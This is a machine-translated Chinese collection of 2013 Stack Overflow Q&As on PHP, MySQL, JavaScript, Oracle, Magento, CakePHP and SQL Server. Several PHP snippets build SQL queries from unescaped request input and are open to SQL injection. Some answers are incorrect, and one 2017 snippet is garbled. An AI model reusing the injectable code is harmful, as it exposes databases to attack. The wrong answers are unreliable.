通过“Webspace”，我认为它是 Web 托管设置（WAMP 或 LAMP）之一，它至少包括：一些磁盘空间（创建文件）和一个编程平台（php、js 等）。

典型的实现是创建一个充当服务的 php 脚本，即公开上传和下载功能。它可能包括在做任何事情之前要求用户登录的代码。

您还可以设置一个数据库（通常是 MySQL），用于将结构化信息与文件分开保存。

其他变量是通信方式，它取决于通信的复杂性。对于简单的获取和发布请求，甚至 HTTP 就足够了（REST），如果您使用图像传输更复杂的数据，例如名称、标签、位置等，您可能想要使用 JSON。最后，如果您想以重量级标准实现它，您可以使用 XML（SOAP 等）。

我确信有许多基于 php 的框架和解析库可用于快速 Web 服务设置。

# gwt - 如何将客户端日志消息输入服务器并将它们保存在 gwt 中的文件中

> ID：14847404
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:03:40.490
> 
> 标签：gwt, logging

我一直在努力寻找这个问题的答案，但我并没有从 google.docs 获得那么多的支持。有谁能够帮我。

如果您有此模板，请将其发送到此地址：uthicon.arun@gmail.com

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T08:34:44.277

1) GWT 2.5 带有很棒的日志记录 API。如果您还没有遇到 Dev Guided GWT 日志记录，请参考[https://developers.google.com/web-toolkit/doc/latest/DevGuideLogging](https://developers.google.com/web-toolkit/doc/latest/DevGuideLogging)

2)仅当 GWT 库中的默认日志不足以避免性能和维护问题时，才应选择[gwt-log](http://code.google.com/p/gwt-log/)等第三方库。

3) 您可以从以下**[文件](http://google-web-toolkit.googlecode.com/files/gwt-2.5.0.zip)**下载示例。

## 浏览示例代码 -[用于远程日志记录的 GWT 示例](http://code.google.com/p/google-web-toolkit/source/browse/trunk/samples/logexample)

*你想要简单多少？*

# mysql - UNION SELECT 的问题

> ID：14847406
> 
> 赞同：0
> 
> 时间：2013-02-13T06:03:44.840
> 
> 标签：mysql, sql

我已经工作了几天来解决这个小问题。

我正在尝试使用 UNION 从两个表中获取数据。但返回的是这个错误代码：

> 警告：mysql_fetch_array() 期望参数 1 是资源，布尔值在.....

这是什么意思，我做错了什么？

我的代码行如下所示：

> $result = mysql_query("SELECT * FROM $tablet1 WHERE id1=$cho1 UNION SELECT * FROM $tablet2 WHERE id2=21");

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:10:13.137

您的查询失败并返回`FALSE`，而不是生成查询资源。这就是`mysql_fetch_array()`返回错误的原因。

始终检查返回值。你可以这样做

```
$result = mysql_query("SELECT ...");
if ($result) {
    //Iterate through the resultset
    while ($row = mysql_fetch_assoc($result)) {
    ...
    }
} else {
    echo 'Invalid query: ' . mysql_error();
    //Do whatever you need to do to recover

} 
```

**正如其他人建议的那样，检查并确保两个 select 语句`UNION`返回的列数相同，并且相应位置的列具有相同的数据类型。**

> **查看更多[13.2.8.4。UNION 语法](http://dev.mysql.com/doc/refman/5.0/en/union.html)**
> 
> 在每个 SELECT 语句的相应位置列出的选定列应具有相同的数据类型。（例如，第一个语句选择的第一列应该与其他语句选择的第一列具有相同的类型。）

*附带说明：*请不要将 mysql_* 函数用于新代码。[自 PHP 5.5.0 起，](http://php.net/manual/en/intro.mysql.php)它们已被弃用。对[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli)使用 [准备好的语句](http://goo.gl/vn8zQ)。这是很好的[PDO 教程](http://goo.gl/vFWnC)。而且您的代码对 sql-injections 是开放的。再次使用准备好的语句。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:52:55.857

首先，您需要检查两个查询中的列和数据类型是否相同，因为您使用的是 UNION 运算符。

现在如果你想使用 mysql_fetch_array：

mysql_fetch_array 函数将 MySQL 查询资源作为参数 ($result) 并返回 mysql_query 返回的第一行数据。

就像下面的代码：

```
<?php
// Make a MySQL Connection
$query = "SELECT * FROM example"; 

$result = mysql_query($query) or die(mysql_error());

while($row = mysql_fetch_array($result)){
    echo $row['name']. " - ". $row['age'];
    echo "<br />";
}
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:13:41.150

请检查以下代码：

```
$result = mysql_query("SELECT T1.column1,T1.column2,T1.column3,T1.column4,T1.column5 
                       FROM $tablet1 T1 WHERE T1.id1=$cho1 

                       UNION 

                       SELECT T2.column1,T2.column2,T2.column3,T2.column4,T2.column5 
                       FROM $tablet2 T2 WHERE T2.id2=21 
                      "); 
```

表 1 中的列数及其在表 1 中的数据类型应与表 2 匹配。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:08:14.090

请确保两个表列的数据类型和列号相同。

# javascript - window.onbeforeunload 在 IE 中触发部分回发事件

> ID：14847407
> 
> 赞同：5
> 
> 时间：2013-02-13T06:03:54.887
> 
> 标签：javascript, jquery, internet-explorer, back-button, onbeforeunload

如果用户在文本框中输入了某些内容，我想在刷新或按浏览器的返回按钮时警告用户。所以我使用了 window.onbeforeunload 函数来做到这一点。

```
window.onbeforeunload = function () {
    if (if user hasn't entered any thing) {
        return;
    }
    return 'Entered data will be lost.';
}; 
```

此 javascript 代码在 Firefox 和 chrome 中运行良好。但在 IE 中，此函数会触发带有部分回发的按钮。在 IE 中解决这个问题的任何解决方案？谢谢 ：）

*   这是因为 IE 中的错误而发生的

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T09:22:20.753

window.onbeforeunload 函数无法在 IE 中正确执行。因为一些部分回发也被认为是“试图离开页面”。如果页面上的链接具有 href="javascript:...."（ASP.Net LinkBut​​ton 是这样呈现的），则 IE 在单击链接时会错误地触发窗口卸载事件。所以，我保留了一个dirtyflag变量并添加了

```
var __ignoreDirtyFlag = false;

$(document).ready(function () {
    if ($.browser.msie) {
        $('[href^="javascript:"]').bind('click.ignoreDirtyFlag', function () {
            __ignoreDirtyFlag = true;
        });
    }
}); 
```

现在，当页面加载时，以 href^="javascript:" 开头的链接将分配该功能。当点击链接时，它使 __ingoreDirtyFlag 变量为真；然后添加

```
window.onbeforeunload = function globalWindowUnload() {
    if (!__ignoreDirtyFlag && isDataFilled == true) {
        return "You have unsaved changes on this page. If you leave this page, those changes will be lost.";
    }
    __ignoreDirtyFlag = false;
    return;
}; 
```

如果您在页面中使用了任何 asp 更新面板，则上述与链接的函数绑定将被删除。所以我们必须在更新面板刷新时再次将函数绑定到链接。

所以，

```
function foo() {
    Sys.WebForms.PageRequestManager.getInstance().add_endRequest(endRequestHandler);
}

function endRequestHandler(sender, args) {
    // Do your stuff
    if ($.browser.msie) {
        $('[href^="javascript:"]').bind('click.ignoreDirtyFlag', function () {
            __ignoreDirtyFlag = true;
        });
    }
} 
```

和

对于 body 标签 onload 方法，我分配了 foo() 方法。 `<body onload="foo()">`

这个黑客在 IE 和所有浏览器上都可以正常工作:) 谢谢

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-05T13:24:02.680

`var inFormOrLink = false; var url_auth = ''; var __ignoreDirtyFlag = false;

```
document).ready(function () {

if ($.browser.msie) {
    $('').bind('click.ignoreDirtyFlag', function () { __ignoreDirtyFlag = true; alert("teste luiz") });

    window.onbeforeunload = function () {
        if (!__ignoreDirtyFlag) {
            return "Tem certeza que deseja encerrar a sessão TESTE LUIZ?";
        }
        __ignoreDirtyFlag = false;
        return;
    };
}
else {
    $('*').live('click', function () { inFormOrLink = true; alert("Passou aqui 1 LUIZ"); });
    $('*').bind('submit', function () { inFormOrLink = true; alert("Passou aqui 2"); });
    window.onbeforeunload = function () {
        if (!inFormOrLink) {

            if (window.location.href.indexOf("DEV2") != -1) {
                $.post("/DEV2/SSQ/AUTH/LOGOUT", null);
                return 'Tem certeza que deseja encerrar a sessão TESTE DEV2?';
            }` 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-05T18:28:57.430

目的是在用户关闭浏览器或手动更改目标 url 时注销用户

```
var url_auth = '';var __ignoreDirtyFlag = false;$(document).ready(function () {if ($.browser.msie) {$('a').live('click', function () { __ignoreDirtyFlag = true;}); $('*').bind('submit', function () { __ignoreDirtyFlag = true; });window.onbeforeunload = function () {if (!__ignoreDirtyFlag) {if (window.location.href.indexOf("DEV2") != -1) {$.post("/DEV2/SSQ/AUTH/LOGOUT", null);return 'Tem certeza que deseja encerrar a sessão ?';}}}; 
```

# java - Sql Query 在 oracle SQL Developer 中运行但是当我从我的 JAVA 程序运行查询时，它给出了 Sql 异常

> ID：14847420
> 
> 赞同：0
> 
> 时间：2013-02-13T06:04:56.650
> 
> 标签：java, sql, oracle

我正在使用以下查询获取一些数据

```
SELECT    
t.value_date,t.settlement_date,    
  (CASE WHEN NVL( t.settlement_date, '01-01-9999')='01-01-9999'
    THEN t.value_date
    ELSE t.settlement_date
  END) AS modified_value_date,    
  t.instrument_pk,    
  bct.base_ccy_pk,    
  i.contract_size,    
  lc.min_trading_unit AS min_trading_unit_lc,    
  bc.min_trading_unit AS min_trading_unit_bc    

FROM transaction t,    
  bc_transaction bct,    
  instrument i,    
  instrument lc,    
  instrument bc

WHERE t.status         = 'NORMAL'    
AND t.fund_pk          = 99436    
AND t.instrument_pk    = 235342    
AND t.instrument_pk    = i.instrument_pk    
AND t.local_ccy_pk     = lc.instrument_pk    
AND bct.transaction_pk = t.transaction_pk    
AND bct.base_ccy_pk    = bc.instrument_pk    
AND t.value_date      >= to_date('20121123000000','yyyymmddhh24miss')    
AND t.transaction_type = 'SECURITY_TRADE'    
ORDER BY modified_value_date,    
  t.processing_order,    
  t.txn_reference_no; 
```

问题是当我在 Oracle SQL Developer 中运行上述查询时，它给出了正确的结果。但是，当我尝试使用 PreparedStatement 从我的 java 程序运行查询时，它会产生一个异常，如**java.sql.SQLException: ORA-01843: not a valid month**

当我将 CASE bolck 中的日期替换为

```
(CASE WHEN NVL(t.settlement_date,to_date('99990101000000','yyyymmddhh24miss'))=to_date('99990101000000','yyyymmddhh24miss') 
    THEN t.value_date 
    ELSE t.settlement_date 
  END) AS modified_value_date 
```

现在我的问题是

1.  **为什么会有这种差异**？如果问题出在 to_date() 那么它应该在 SQL 开发人员中也给出相同的异常。
2.  **问题并没有在这里结束**我看到当我再次从 Eclipse 调试我的程序时，相同的查询在 NVL 块中没有 to_date() 的情况下完美运行我检查并发现我的 JDK 是 1.5 但 JRE 是 1.6。然后我改变了我的JRE 到 1.5 并调试相同的 java 程序，发现它在调试时产生相同的异常，对于 NVL 块中没有 to_date() 的相同查询。

    现在我完全搞砸了，**为什么 JRE 5 和 JRE 6 之间存在这种差异**？

**谁能帮我？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:18:24.380

这与 JRE 版本无关，而是与您的会话设置有关。您已指定字符串并离开 Oracle 会话以使用 NLS 设置（可能是 NLS_DATE_FORMAT）隐式转换为日期。
帮自己一个忙——永远不要让硬编码的值依赖于外部设置。
你可以`DATE'9999-01-01'`改用。

# php - PHP + AJAX + jQuery 评论/回复系统在拉取第一个回复后停止工作

> ID：14847424
> 
> 赞同：0
> 
> 时间：2013-02-13T06:05:05.703
> 
> 标签：php, javascript, jquery, ajax

基本上，我有一个评论系统，我正在尝试添加 AJAX/jQuery 支持，以便用户可以查看“回复”评论，类似于 Youtube 处理评论和回复的方式。

显示与文章相关的每条评论 (comment_view.php)，如果它是对另一个评论的回复，则会显示一个按钮，用户可以单击该按钮来查看它正在回复的评论。

最初的评论显示正常，然后当单击“回复”按钮时，回复也按预期显示！但是，当从刚刚返回的回复中单击下一个“回复”按钮时，什么也没有发生。

另一个奇怪的事情是，如果我摆脱`style="display: none;"`了回复 div，它似乎可以工作，并且一直拉动所有的“回复”，尽管没有 jQuery“显示”动画。

对这里发生的事情有任何想法吗？

总共涉及 3 个文件：article.php、comment_view.php 和 getreply.php，详述如下：

**article.php（片段）**

该文件访问数据库并提取一篇文章及其相关评论

```
foreach ($comments as $comment) {
    echo '<div id="comment'.$comment['id'].'" class="comment">';
    require 'comment_view.php';
    echo '</div>';
} 
```

**评论视图.php**

该文件包含在 article.php（上）和 getreply.php（下，通过 AJAX 从下面的 JavaScript 中获取）中

```
$_SESSION['rnum']++; //session variable that gets incremented to make sure each reply div id is unique

if ($comment['reply_to_id'] != null) {
    echo '<div id="reply'.$_SESSION['rnum'].'" style="display: none;"></div>'; //empty/hidden div to hold the future contents of a reply, which ends up being this file, instantiated by getreply.php (below) with a new $comment from database
}

echo '<div class="content">';
echo nl2br($comment['content']);
if ($comment['reply_to_id'] != null) {
    echo '<br/><button id="showreply'.$_SESSION['rnum'].'" onclick="showReply('.$comment['reply_to_id'].','.$_SESSION['rnum'].'); this.disabled = true;">In reply to -> '.$comment['reply_to_id'].'</button>';
    echo '<script>$("#showreply'.$_SESSION['rnum'].'").click(function () { $("#reply'.$_SESSION['rnum'].'").show("slow"); });</script>';
}
echo '</div>'; //content 
```

**JavaScript（位于 article.php 的标题中）**

此 AJAX 函数获取 comid（评论 ID）并将其传递给 getreply.php，以便它知道要从数据库中提取哪个回复。它还需要 rnum 找出回复 div 的唯一 ID 以替换其内容。

```
<script>
function showReply(comid,rnum) {
    if (comid=="") {
        document.getElementById("reply"+rnum).innerHTML="";
        return;
    } 
    if (window.XMLHttpRequest) {
        // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    }
    else {
        // code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function() {
        if (xmlhttp.readyState==4 && xmlhttp.status==200) {

            document.getElementById("reply"+rnum).innerHTML=xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET","getreply.php?id="+comid,true);
    xmlhttp.send();
}
</script> 
```

**getreply.php**

此文件采用 AJAX 传递的 comid（评论 ID）从数据库中提取回复评论，然后重新调用 comment_view.php（然后应该为下一个潜在回复生成另一个新的唯一 rnum，并吐出评论）

```
session_start();

$query = "SELECT * FROM comments WHERE id = ".$_GET['id'];
$result = $mysqli->query($query) or die($mysqli->error. " [" . __LINE__ . "]");

if ($result->num_rows == 1) {
    $comment = $result->fetch_assoc();
    require 'comment_view.php';
} 
```

这比我预期的要长一些，但在此先感谢您的帮助或想法......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:26:14.750

根据要求，以答复形式^^

您需要删除`.click`添加到每个回复中的脚本，而是将其放在`$("#reply"+rnum).show("slow");`您`document.getElementById("reply"+rnum).innerHTML=xmlhttp.responseText;`的代码中。发生这种情况的原因是有两个`click`事件与按钮相关联并且它们相互冲突。此外，在得到回复之后放置它是一种很好的做法，为什么`.show`会有一些东西要显示，而不是在得到回复之前显示空的 div。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:46:36.840

在您使用的第一个片段中

```
require 'comment_view.php'; 
```

这将适用于一条评论。一旦你有第二条评论，它应该会抛出一个错误，因为`comment_view.php`它已经是必需的。将其更改为

```
require_once 'comment_view.php'; 
```

看看它现在是否有效。

# iphone - 我们如何区分在使用应用程序时接听电话和单击主页按钮后关闭应用程序？

> ID：14847427
> 
> 赞同：0
> 
> 时间：2013-02-13T06:05:20.203
> 
> 标签：iphone, ios, objective-c

当用户每次点击主页按钮或接到呼叫应用程序时

```
- (void)applicationWillResignActive:(UIApplication *)application 
```

然后

```
- (void)applicationDidEnterBackground:(UIApplication *)application. 
```

我已经检查了将日志放入 AppDelegate 的所有委托方法。

Apple是否有任何限制我们无法区分这两种状态？

# php - Magento：在导出 CSV 中获取产品 URL

> ID：14847429
> 
> 赞同：0
> 
> 时间：2013-02-13T06:05:31.267
> 
> 标签：php, magento, magento-1.7

在 magento 中，我如何在我的产品导出 CSV 中获取产品完整 url 即 SITE_URL/PRODUCT URL 我正在谷歌搜索这些东西，但找不到与此相关的任何内容....

我还挖掘了法师 app/code/core/Mage/ImportExport/Model/Export/Entity 并编辑以下文件 Product.php 但可以找到 URL_PATH 列以包含完整路径

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T08:33:15.133

好吧，我自己在这里找到了解决方案，我想在 url_path 列下添加产品的完整 url 路径
1) 在路径 app/code/core/Mage/ImportExport/Model/Export/Entity
2)处编辑文件号码 630

```
 foreach ($validAttrCodes as &$attrCode) { // go through all valid attribute codes 
```

3）这是为导出提供所有属性
4）我插入了一个条件

```
if($attrCode=='url_path'){
                            $attrValue = str_replace('index.php/','',Mage::getBaseUrl()).$attrValue;
                        } 
```

5）测试我的导出，一切都很好
最后我知道我破解了代码，但我没有足够的时间来编写模块，甚至我也不知道如何...... :-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-05-25T09:28:07.787

我是这样做的：

```
 // Gets the current store's id
            $store = Mage::app()->getDefaultStoreView();
            $product->setStoreId($store->getStoreId());

            //prepare csv contents
            $data = array();
            $data[] = $product['sku'];
            // this is the URL:
            $data[] = $product->getProductUrl(); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-13T06:52:09.953

嗨，在 csv 中，您无法获取站点 URL，因为在磁电机中，它会自动将站点 URL 与目录路径连接起来。你能告诉我为什么你需要csv中的网站网址吗

# php - 如何放置里面标签？

> ID：14847432
> 
> 赞同：-4
> 
> 时间：2013-02-13T06:05:38.573
> 
> 标签：php, forms

我的问题是当用户选择一个文件时，文件名应该出现在文本字段中。请告诉我这是怎么做的？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:27:46.797

你的 HTML

```
<input type="file" id = "file_upload" />
<input id="file_name" type="text" /> 
```

你的 javascript

```
document.getElementById('file_upload').onchange = file_name;

function file_name() {
    var filename = this.value;
    var lastIndex = filename.lastIndexOf("\\");
    if (lastIndex >= 0) {
        filename = filename.substring(lastIndex + 1);
    }
    document.getElementById('file_name').value = filename;
} 
```

# wso2 - 如何在不选择或使用“输入映射类型”的情况下将 Map-input-stream 作为事件直接传输到 WSO2-CEP？

> ID：14847433
> 
> 赞同：0
> 
> 时间：2013-02-13T06:05:41.063
> 
> 标签：wso2, complex-event-processing, esper

我将 WSO2-CEP 与 Esper（作为运行时）一起使用，Esper 将 Map 上的查询处理为元组上的 siddhi。“输入映射类型”基本上声明了例如**XML 映射**所需的输入转换类型：**XML**到 Map 或 Tuple。我有通过将 xml 事件转换为映射来运行示例，但是如果我将“映射作为输入事件”并且我只想将它们作为映射处理怎么办？任何帮助，将不胜感激！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:12:17.087

WSO2 贬值了 Esper（和 Drools），转而支持他们的新 Siddhi 引擎

# html - 在网页上加载自定义 html 和 css？

> ID：14847437
> 
> 赞同：0
> 
> 时间：2013-02-13T06:06:08.010
> 
> 标签：html, css, webpage

我真的不知道你怎么称呼这个，所以我不知道在谷歌中输入什么来进一步研究这个。我想知道您如何在加载时删除网页的某些元素。很多用户脚本都使用它。我想知道怎么做。我认为有些网页只是混乱的方式，我厌倦了编辑源代码来清理它。那么我该怎么做呢？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:16:20.493

您可以在加载后删除元素。在加载整个源代码之前，某些浏览器无法删除元素。比谷歌的removeNode。用法是 parentElement.removeNode(removingElement)。ParentElement 和 removeElement 是对元素的引用，而不是对 ID 的引用。

如果在服务器端，则必须使用一些 preg 函数来匹配和替换代码，或者更好的是，使用 XML 函数来解析代码并删除一些元素（注意：这需要 100% 有效的代码）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:29:28.677

脚本如何确定什么对您有用或无用？这是一个主观问题

您是否希望新行上的每个代码都整洁？例如，您是否希望[这种](http://www.ianlunn.co.uk/demos/recreate-nikebetterworld-parallax/scripts/jquery.inview.js)类型的代码在新行上而不是像[这样](http://www.labnol.org/wp/wp-content/cache/minify/000000/hY5hDsMgCIUv1OqOsis4yyILglOM8fbTttn-rQkJvPB4fC3ZllZkT3WDYl-j3hVyP9vS9r0XVmC1GiAOFxBE5Gl2dUNZE7kOeblZcg8WMsVnTPrTEbj-TZoKn30mnqMpQbJ6GVBXDAepSRlU-z2IytXF98fO-QE.js.pagespeed.jm.9OroOFUjMY.js)

更新：这是一个技巧

将整个代码复制粘贴到 jsfiddle. 并在每次更改时保存

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:44:02.170

对于Firefox，您可以使用greasemonkey [https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/)这里是如何在Windows 上使用greasemonkey for chrome [http://mashable.com/2008/12/15 /google-chrome-greasemonkey-脚本/](http://mashable.com/2008/12/15/google-chrome-greasemonkey-scripts/)

# c# - 当我在 VS 中添加引用时会发生什么？

> ID：14847438
> 
> 赞同：0
> 
> 时间：2013-02-13T06:06:08.320
> 
> 标签：c#, asp.net, dll

当我向当前项目添加引用（对项目/dll）时，实际发生了什么？是否只是将引用的 dll 复制到当前项目 bin 文件夹？我很确定它不止于此。有什么建议读吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:16:54.977

将 .csproj 文件扩展名更改为 .xml 并查看实际添加的内容，它只是 Microsoft 专有的 xml。我想你会发现引用现在位于文件中间的一个名为“itemgroup”的元素下。

# grails - Grails Date 被接受为字符串

> ID：14847441
> 
> 赞同：1
> 
> 时间：2013-02-13T06:06:19.540
> 
> 标签：grails, grails-orm, simpledateformat

在我的 grails 域中，我有一个字段 Date，即 java.util.Date。

在我的控制器中，我使用 SimpleDateFormate 从参数加载此日期。

准确地说，假设 params.date 类似于“20/02/2013 02:30 am”。在控制器中，我按如下方式加载：

SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm a"); domainInstance.date = simpleDateFormat.parse(params.date)

执行此语句时未检测到错误。但是，当域实例被保存时，会生成错误

[typeMismatch.Domain.date,typeMismatch.date,typeMismatch.java.util.Date,typeMismatch]; 参数 [org.springframework.context.support.DefaultMessageSourceResolvable：代码

[无法将类型“java.lang.String”的属性值转换为属性“date”所需的类型“java.util.Date”；嵌套异常是 java.lang.IllegalArgumentException：无法解析日期：无法解析的日期：“20/02/2013 02:30 am”]

谁能告诉我哪里出了问题。我很确定 SimpleDateFormat 将字符串解析为日期。为什么它接受为字符串。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-14T07:38:44.460

感谢您的回复，但我已经找到了问题的解决方案。问题是这样的。

我将我的 domainInstance 实例化为 domainInstance = new Domain(params) 这是控制器操作中的第一条语句。

执行此语句时，params 以“dd/MM/yyyy HH:mm a”格式保存日期。因此，此语句在 domainInstance 对象中添加了一个错误。

稍后在使用 SimpleDateFormat 后，变量会更新，但错误仍然存​​在于对象中，因此会出现错误。

此错误的解决方案是在语句“domainInstance = new Domain(params)”之后立即调用语句 domainInstance.clearErrors()。

这将清除对象中的所有错误。稍后在保存 domainInstance 时，将调用 validate。如果由于某些其他错误而导致验证失败，则此时会添加相应的错误。

拉莫汉

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-30T08:28:29.083

Grails 2.3.1 是实际问题

```
def domain = new FooBar(params)
domain.clearErrors()
domain.save(flush:true) // <--- validation will be there
if (doamin.hasErrors()) {
 ... do something
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:20:37.810

你可以试试：

```
domainInstance.date = new Date().parse("dd/MM/yyyy HH:mm a", params.date) 
```

# excel - 自定义函数在 Excel VBA 中不起作用

> ID：14847449
> 
> 赞同：4
> 
> 时间：2013-02-13T06:06:57.850
> 
> 标签：excel, function, vba

由于某种原因，自定义函数似乎没有在 Excel 中运行。我在下面创建了一个简单的函数，但无论它是用作工作表函数还是从过程中调用，它总是返回零作为值。任何人都知道我做错了什么，或者我错过了什么地方？

```
 Public Function Testthisout(number As Double) As Double
    result = number * number
  End Function

  Public Sub TESTFUNCTION()
    Dim number As Double
    Dim result As Double

    Application.Volatile (True)

    number = 4
    result = Testthisout(number)
    MsgBox result
  End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:10:28.457

将您的功能更改为：

```
Public Function Testthisout(number As Double) As Double
  result = number * number
  Testthisout = result
End Function 
```

# php - 如何增加 cakephp 中的会话寿命？

> ID：14847452
> 
> 赞同：0
> 
> 时间：2013-02-13T06:07:10.173
> 
> 标签：php, session, cakephp, cakephp-1.3, cakephp-1.2

我正在尝试增加 cakephp 应用程序中的会话寿命。我`remember me`在登录页面中有一个复选框。选中复选框时，我需要将会话时间延长到当前时间再延长 1 小时，登录后应用程序内的任何操作都需要将会话时间延长到 1 小时。

我有用于登录的组件文件，所有操作都将在**启动功能**中输入。我试图延长`session.cookie`（CakePHP 的会话 cookie）的生命周期，但没有奏效。

```
function startup(&$controller) {
  /* First try */
  setcookie(Configure::read('Session.cookie'),$_COOKIE[Configure::read('Session.cookie')], time() + 3600, "/"); // Configure::read('Session.cookie') is 'CAKEPHP'.
  /* Second try */
  ini_set('session.gc_maxlifetime', 3600);
  /* Third try */
  session_set_cookie_params(time() + 3600);

  echo $this->Session->read('status').'   session  <br/>';
  echo $_SESSION['test'];
} 
```

但是所有这些都不会在`session.timeout`（CakePHP 的会话超时）时间之后保持会话。会话`status`和`test`变量是在登录时创建的。它将被检索，直到`session.timeout`未达到。

我正在使用 cakephp **v1.2**。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T05:58:11.243

```
keep this in your core.php file 
Configure::write('Session', array(
        'defaults' => 'cake',
            'timeout'  => 14400,  // 4 hours 
            'cookieTimeout' => 14400, // 4 hours 
            'cookie' => 'Your Cookie Name',
            )
        ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-01T12:45:29.710

保持非常高的会话超时不是一个好主意。如果您的要求只是让他记录更多时间，请使用一些 auto_login 组件，例如[www.milesj.me/resources/script/auto-login](http://www.milesj.me/resources/script/auto-login)

# php - 阵列推送不起作用

> ID：14847453
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:07:11.253
> 
> 标签：php

我通过以下方式创建了一个类

```
 class History
    {
      private  $historyArray;
      private $cacheFileNameArray=array();
      public function __construct()
      {
       $this->historyArray=array();
      } 
      public function writeToHistory($query)
      {
       $cacheFileName=$this->getCacheFileName();
       $query=$query.chr(219)."1".chr(219).$cacheFileName;
       array_push($this->historyArray,$query);
       print_r($this->historyArray);
      }
     } 
```

现在我创建了一个History类的对象作为h，然后我用2个不同的参数调用函数writeToHistory（）两次，我想知道array_push（）在第二次调用函数时不起作用，查询应该写在数组的第一个索引中，但实际上数组的第一个元素正在被替换。知道为什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:13:37.970

是的，@shapeshifter 是对的。它是静态的。

你甚至可以做

```
array_push(History->$historyArray, $query); 
```

或者

```
array_push(self::$historyArray, $query); 
```

或者

```
History->$historyArray[] = $query; 
```

PHP 手册说“如果你使用 array_push() 向数组添加一个元素，最好使用 $array[] = 因为这样就没有调用函数的开销。” [（来自http://php.net/manual/en/function.array-push.php](http://php.net/manual/en/function.array-push.php)的注释）；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:09:47.223

您的 historyArray 是静态的。尝试，

```
array_push(self::$historyArray,$query); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:13:13.513

为什么在构造函数中将 historyArray 声明为数组？
另外，你的类中定义的函数''在哪里？如果它没有定义，那可能会给你带来麻烦...... getCacheFileName();

并且，给我们一个你传递给你的 writeToHistory 函数'$query'变量的例子，这样我们就可以轻松地查看发生了什么

将您的代码更改为以下内容：

```
class History
    {
      private  $historyArray = array();
      private $cacheFileNameArray= array();
      public function __construct()
      {

      } 
      public function writeToHistory($query)
      {
       $cacheFileName=$this->getCacheFileName();
       $query=$query.chr(219)."1".chr(219).$cacheFileName;
       array_push($this->historyArray,$query);
       print_r($this->historyArray);
      }
     } 
```

# sql-server - SQL Server 2008 R2 中的隔离级别

> ID：14847454
> 
> 赞同：1
> 
> 时间：2013-02-13T06:07:13.580
> 
> 标签：sql-server, sql-server-2008-r2

我浏览了整个 Microsoft 站点以了解 SQL Server 2008 R2 中的隔离级别。但是，在采用之前，我想听取 SO 专家的建议。

我有一个基于 PHP 的网页，主要用作仪表板。用户（不超过 5 个）每天将上传批量数据（大约 40,000 行），大约 70 个用户将只能访问数据库。请注意，我为这 5 位用户设置了上传时间，但我想对任何数据丢失进行错误证明。帮我解决以下问题：

*   我可以使用的最佳隔离级别是什么？
*   默认的 READ COMMITTED 隔离对我有帮助吗？
*   除了 TSQL 语句之外，还有没有办法通过 SSMS 为特定数据库设置隔离级别？（数据库的通用隔离）

70 个用户将有下载选项，如果所有或大多数用户同时尝试下载，数据库是否有可能损坏？我该如何避免同样的情况？

任何专家的建议......

问候， Yuvraj S

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T06:30:22.477

隔离级别实际上与正在读取的数据上的共享锁保持多长时间有关。但正如 Lieven 已经提到的那样：这些**不是**为了防止数据库中的“损坏”——而是为了防止读者和作者相互妨碍。

首先：任何写操作（`INSERT`, `UPDATE`）将**始终**需要对该行的**排**他锁，并且排他锁与其他任何内容都不兼容 - 所以如果要更新的给定行已经被锁定，任何`UPDATE`操作都必须等待 - 没办法围绕这个。

对于**读取数据**，SQL Server 取出**共享锁**- 隔离级别与持有这些锁的时间有关。

**默认**隔离级别 ( ) 意味着：SQL Server将`READ COMMITTED`尝试在一行上获取共享锁，如果成功，则读取该行的内容并立即再次释放该锁。所以锁只存在于被读取行的短暂时间内。共享锁与其他共享锁兼容，因此任意数量的读取器可以同时读取相同的行。然而，共享锁阻止了排他锁，因此共享锁主要阻止`UPDATE`了同一行。

